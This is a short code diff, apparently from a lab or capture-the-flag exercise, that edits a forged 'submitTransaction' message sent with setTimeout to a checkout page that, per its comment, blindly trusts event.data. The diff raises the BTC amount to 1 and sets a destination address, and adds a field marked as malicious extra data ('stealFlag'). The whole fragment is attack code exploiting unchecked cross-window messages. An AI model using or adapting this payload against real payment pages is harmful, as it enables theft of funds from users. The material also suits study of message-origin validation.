@@ -16,8 +16,8 @@ setTimeout(() => {
     type: "submitTransaction",
     transaction: {
       currency: "BTC",
-      amount: 0.00000001,
-      toAddress: "ATTACKER"
+      amount: 1,
+      toAddress: "1744034f7dd40343da758f9af362f4c88b"
     },
     // 👇 malicious extra data (checkout blindly trusts event.data)
     stealFlag: true
